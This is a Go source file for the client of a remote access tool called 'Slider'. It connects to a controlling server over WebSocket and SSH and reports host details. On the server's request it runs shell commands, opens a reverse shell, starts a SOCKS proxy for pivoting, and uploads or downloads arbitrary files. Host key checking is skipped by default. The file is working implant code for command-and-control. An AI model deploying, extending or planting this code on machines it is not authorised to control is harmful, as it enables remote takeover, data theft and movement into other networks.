package client

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"slices"
	"slider/pkg/conf"
	"slider/pkg/interpreter"
	"slider/pkg/sconn"
	"slider/pkg/scrypt"
	"slider/pkg/sio"
	"slider/pkg/slog"
	"slider/pkg/ssocks"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

type sessionTrack struct {
	SessionCount  int64              // Number of Sessions created
	SessionActive int64              // Number of Active Sessions
	Sessions      map[int64]*Session // Map of Sessions
}

type client struct {
	*slog.Logger
	serverAddr        string
	keepalive         time.Duration
	wsConfig          *websocket.Dialer
	httpHeaders       http.Header
	sshConfig         *ssh.ClientConfig
	verbose           string
	shutdown          chan bool
	serverFingerprint []string
	sessionTrack      *sessionTrack
	sessionTrackMutex sync.Mutex
	isListener        bool
}

const clientHelp = `
Slider Client

  Creates a new Slider Client instance and connects 
to the defined Slider Server.

Usage: ./slider client [flags] <[server_address]:port>

Flags:
`

func NewClient(args []string) {
	clientFlags := flag.NewFlagSet("client", flag.ContinueOnError)
	verbose := clientFlags.String("verbose", "info", "Adds verbosity [debug|info|warn|error]")
	keepAlive := clientFlags.Duration("keepalive", conf.Keepalive, "Sets keepalive interval in seconds.")
	colorless := clientFlags.Bool("colorless", false, "Disables logging colors")
	fingerprint := clientFlags.String("fingerprint", "", "Server fingerprint for host verification")
	key := clientFlags.String("key", "", "Private key to use for authentication")
	listener := clientFlags.Bool("listener", false, "Client will listen for incoming Server connections")
	port := clientFlags.Int("port", 8081, "Listener Port")
	address := clientFlags.String("address", "0.0.0.0", "Address the Listener will bind to")
	clientFlags.Usage = func() {
		fmt.Printf(clientHelp)
		clientFlags.PrintDefaults()
		fmt.Println()
	}

	if fErr := clientFlags.Parse(args); fErr != nil {
		return
	}

	if slices.Contains(clientFlags.Args(), "help") || (len(clientFlags.Args()) == 0 && !*listener) || (len(clientFlags.Args()) > 0 && *listener) {
		clientFlags.Usage()
		return
	}

	log := slog.NewLogger("Client")
	if lvErr := log.SetLevel(*verbose); lvErr != nil {
		fmt.Printf("%s", lvErr)
		return
	}

	// It is safe to assume that if PTY is On then colors are supported.
	if interpreter.IsPtyOn() && !*colorless {
		log.WithColors()
	}

	c := client{
		Logger:    log,
		keepalive: *keepAlive,
		shutdown:  make(chan bool, 1),
		sessionTrack: &sessionTrack{
			Sessions: make(map[int64]*Session),
		},
	}

	c.sshConfig = &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-slider-client",
		Timeout:         60 * time.Second,
	}

	if *key != "" {
		if aErr := c.enableKeyAuth(*key); aErr != nil {
			c.Fatalf("%s", aErr)
		}
	}

	if *fingerprint != "" {
		if fErr := c.loadFingerPrint(*fingerprint); fErr != nil {
			c.Fatalf("%s", fErr)
		}
		c.sshConfig.HostKeyCallback = c.verifyServerKey
	}

	// Check the use of extra headers for added functionality
	// https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism
	c.httpHeaders = http.Header{}

	if *listener {
		c.isListener = *listener
		l, lisErr := net.Listen(
			"tcp",
			fmt.Sprintf("%s:%d", *address, *port),
		)
		if lisErr != nil {
			c.Fatalf("Listener: %v", lisErr)

		}

		c.Infof("Listening on %s://%s:%d", l.Addr().Network(), *address, *port)
		go func() {
			// TODO: net/http serve has no support for timeouts
			handler := http.Handler(http.HandlerFunc(c.handleHTTPConn))
			if sErr := http.Serve(l, handler); sErr != nil {
				c.Fatalf("%s", sErr)
			}
		}()
	} else {
		c.serverAddr = clientFlags.Args()[0]
		c.wsConfig = conf.NewWebSocketDialer()
		wsConn, _, wErr := c.wsConfig.DialContext(context.Background(), fmt.Sprintf("ws://%s", c.serverAddr), c.httpHeaders)
		if wErr != nil {
			c.Fatalf("Can't connect to Server address: %s", wErr)
			return
		}

		session := c.newWebSocketSession(wsConn)
		session.disconnect = make(chan bool, 1)

		go c.newSSHClient(session)

		<-session.disconnect
		close(session.disconnect)

		// When the Client is not Listener a Server disconnection
		// will shut down the Client
		c.shutdown <- true
	}

	<-c.shutdown
	close(c.shutdown)
}

func (c *client) newSSHClient(session *Session) {
	netConn := sconn.WsConnToNetConn(session.wsConn)

	var reqChan <-chan *ssh.Request
	var newChan <-chan ssh.NewChannel
	var connErr error

	session.sshConn, newChan, reqChan, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
	if connErr != nil {
		c.Errorf("%s\n", connErr)
		session.disconnect <- true
		return
	}
	defer func() { _ = session.sshConn.Close() }()
	c.Infof("Server connected (%s)...", session.wsConn.RemoteAddr().String())
	c.Debugf("Session %v\n", session.sshConn.SessionID())

	// Send Interpreter Information to Server
	clientInfo, cErr := newClientInfo()
	if cErr != nil {
		c.Fatalf("Failed to generate Client Info - %v", cErr)
	}
	clientInfo.IsListener = c.isListener
	session.addInterpreter(clientInfo.Interpreter)
	go session.sendClientInfo(clientInfo)

	if c.keepalive > 0 {
		go session.keepAlive(c.keepalive)
	}

	go session.handleGlobalChannels(newChan)
	session.handleGlobalRequests(reqChan)
}

func (c *client) enableKeyAuth(key string) error {
	// TODO: Probably not the best way to accomplish this
	p := fmt.Sprintf("-----BEGIN PRIVATE KEY-----\n%s\n-----END PRIVATE KEY-----", key)
	signer, pErr := ssh.ParsePrivateKey([]byte(p))
	if pErr != nil {
		return fmt.Errorf("failed to parse private key: %v", pErr)
	}
	c.sshConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}

	return nil
}

func (c *client) loadFingerPrint(fp string) error {
	// Check is fingerprint flag is a file or a fingerprint string
	// A file should contain a list of valid fingerprints
	fileInfo, sErr := os.Stat(fp)
	if sErr != nil {
		c.serverFingerprint = append(c.serverFingerprint, fp)
		return nil
	}
	if fileInfo.IsDir() {
		return fmt.Errorf("fingerprint flag points to a directory not a file")
	}
	file, fErr := os.Open(fp)
	if fErr != nil {
		return fmt.Errorf("failed to read fingerprint file - %s", fErr)
	}
	scan := bufio.NewScanner(file)
	for scan.Scan() {
		if f := scan.Text(); f != "" {
			c.serverFingerprint = append(c.serverFingerprint, f)
		}
	}

	return nil
}

func (c *client) verifyServerKey(hostname string, remote net.Addr, key ssh.PublicKey) error {
	serverFingerprint, fErr := scrypt.GenerateFingerprint(key)
	if fErr != nil {
		return fErr
	}

	if slices.Contains(c.serverFingerprint, serverFingerprint) {
		c.Infof("Server successfully vefified with provided fingerprint")
		return nil
	}

	return fmt.Errorf("server %s - verification failed", remote.String())
}

func (s *Session) sendClientInfo(ci *conf.ClientInfo) {
	clientInfoBytes, _ := json.Marshal(ci)
	ok, _, sErr := s.sshConn.SendRequest("client-info", true, clientInfoBytes)
	if sErr != nil || !ok {
		s.Errorf("client information was not sent to server - %v", sErr)
	}
}

func (s *Session) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
	for nc := range newChan {
		switch nc.ChannelType() {
		case "socks5":
			s.Debugf("Opening \"%s\" channel", nc.ChannelType())
			go s.handleSocksChannel(nc)
		case "file-upload":
			s.Debugf("Opening \"%s\" channel", nc.ChannelType())
			go s.handleFileUploadChannel(nc)
		case "file-download":
			s.Debugf("Opening \"%s\" channel", nc.ChannelType())
			go s.handleFileDownloadChannel(nc)
		default:
			s.Debugf("Rejected channel %s", nc.ChannelType())
			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
				s.Warnf("Received Unknown channel type \"%s\" - %s",
					nc.ChannelType(),
					rErr,
				)
			}
		}
	}
}

func (s *Session) handleGlobalRequests(requests <-chan *ssh.Request) {
	for req := range requests {
		switch req.Type {
		case "keep-alive":
			if err := s.replyConnRequest(req, true, []byte("pong")); err != nil {
				s.Errorf("Error sending \"%s\" reply to Server - %v", req.Type, err)
			}
		case "session-exec":
			s.Debugf("Received \"%s\" Connection Request", req.Type)
			go s.sendCommandExec(req)
		case "session-shell":
			s.Debugf("Received \"%s\" Connection Request", req.Type)
			go s.sendReverseShell(req)
		case "window-change":
			// Server only sends this Request if Interpreter is PTY
			// after Reverse Shell is sent, ergo PTY File has been created
			s.Debugf("Server Requested window change: %s\n", req.Payload)
			var termSize interpreter.TermSize
			if err := json.Unmarshal(req.Payload, &termSize); err != nil {
				s.Fatalf("%s", err)
			}
			s.updatePtySize(termSize.Rows, termSize.Cols)
		case "checksum-verify":
			go s.verifyFileCheckSum(req)
		case "disconnect":
			s.Warnf("Server requested Client disconnection.")
			_ = s.replyConnRequest(req, true, []byte("disconnected"))
			s.disconnect <- true
		default:
			s.Debugf("Received unknown Connection Request Type: \"%s\"", req.Type)
			_ = req.Reply(false, nil)
		}
	}
}

func (s *Session) sendCommandExec(request *ssh.Request) {
	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
	if openErr != nil {
		s.Errorf("failed to open a \"session\" channel to server")
		return
	}
	defer func() { _ = channel.Close() }()

	rcvCmd := string(request.Payload)
	s.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", request.Payload, rcvCmd)

	cmd := exec.Command(s.interpreter.Shell, append(s.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec

	out, _ := cmd.CombinedOutput()
	_, cwErr := channel.Write(out)
	if cwErr != nil {
		s.Errorf("failed to write command \"%s\" output into channel", rcvCmd)
	}

	// Notify Server we are good to go
	if err := s.replyConnRequest(request, true, []byte("exec-ready")); err != nil {
		s.Errorf("failed to send reply to request \"%s\"", request.Type)
	}
}

func (s *Session) keepAlive(keepalive time.Duration) {
	ticker := time.NewTicker(keepalive)
	defer ticker.Stop()

	for {
		select {
		case <-s.disconnect:
			s.Infof("Disconnecting from Server %s...", s.wsConn.RemoteAddr().String())
			return
		case <-ticker.C:
			_, p, sendErr := s.sendConnRequest("keep-alive", true, []byte("ping"))
			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
				s.Errorf("KeepAlive Check Lost connection to Server.")
				s.disconnect <- true
			}
		}
	}
}

func (s *Session) sendConnRequest(reqType string, wantReply bool, payload []byte) (bool, []byte, error) {
	s.Debugf("Sending Connection Request Type \"%s\" with Payload: \"%s\"", reqType, payload)
	return s.sshConn.SendRequest(reqType, wantReply, payload)
}

func (s *Session) replyConnRequest(req *ssh.Request, reply bool, payload []byte) error {
	s.Debugf("Replying Connection Request Type \"%s\" with Payload: \"%s\"", req.Type, payload)
	return req.Reply(reply, payload)
}

func (s *Session) sendSessionRequest(sshSession *ssh.Session, requestType string, ok bool, payload []byte) error {
	okR, err := sshSession.SendRequest(requestType, ok, payload)
	if err != nil {
		return fmt.Errorf("%s %v", requestType, err)
	}
	s.Debugf("Sent Session Request \"%s\", received: \"%v\" from server.\n", requestType, okR)
	return nil
}

func (s *Session) handleSocksChannel(channel ssh.NewChannel) {
	socksChan, req, aErr := channel.Accept()
	if aErr != nil {
		s.Errorf(
			"Failed to accept \"%s\" channel\n%v",
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = socksChan.Close() }()
	go ssh.DiscardRequests(req)

	config := &ssocks.InstanceConfig{
		Logger:       s.Logger,
		IsServer:     true,
		SocksChannel: socksChan,
	}
	s.socksInstance = ssocks.New(config)

	if err := s.socksInstance.StartServer(); err != nil {
		s.Debugf("SOCKS - %s", err)
	}
}

func (s *Session) handleFileUploadChannel(channel ssh.NewChannel) {
	uploadChan, requests, aErr := channel.Accept()
	if aErr != nil {
		s.Errorf(
			"Failed to accept \"%s\" channel\n%v",
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = uploadChan.Close() }()

	go ssh.DiscardRequests(requests)

	filePath := string(channel.ExtraData())

	file, fErr := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0644)
	defer func() { _ = file.Close() }()
	if fErr == nil {
		_, _ = io.Copy(file, uploadChan)
	}
}

func (s *Session) verifyFileCheckSum(req *ssh.Request) {
	var fileInfo sio.FileInfo
	s.Debugf("Received \"%s\" Connection Request", req.Type)
	if err := json.Unmarshal(req.Payload, &fileInfo); err != nil {
		_ = req.Reply(false, []byte("failed to unmarshal file info"))
	}

	_, checkSum, cErr := sio.ReadFile(fileInfo.FileName)
	if cErr != nil {
		_ = req.Reply(false, []byte(fmt.Sprintf("could not read file %s", fileInfo.FileName)))
	}

	if checkSum != fileInfo.CheckSum {
		_ = req.Reply(false, []byte(fmt.Sprintf(
			"checksum of src (%s) differs from dst (%s)",
			fileInfo.CheckSum, checkSum)))
	}
	_ = req.Reply(true, nil)
}

func (s *Session) handleFileDownloadChannel(channel ssh.NewChannel) {
	downloadChan, _, aErr := channel.Accept()
	if aErr != nil {
		s.Errorf(
			"Failed to accept \"%s\" channel\n%v",
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = downloadChan.Close() }()

	srcFile := string(channel.ExtraData())
	file, checkSum, fErr := sio.ReadFile(srcFile)
	if fErr != nil {
		// Rejecting the Reply will tell the server the payload is an error
		_, _ = downloadChan.SendRequest("checksum", false, []byte(fmt.Sprintf("%s", fErr)))
	}
	// If the File was read Successfully we will send its CheckSum as Payload
	_, _ = downloadChan.SendRequest("checksum", true, []byte(checkSum))
	// Copy file over channel
	_, _ = downloadChan.Write(file)
}

func newClientInfo() (*conf.ClientInfo, error) {
	ci, err := interpreter.NewInterpreter()
	if err != nil {
		return &conf.ClientInfo{}, err
	}
	return &conf.ClientInfo{Interpreter: ci}, nil
}
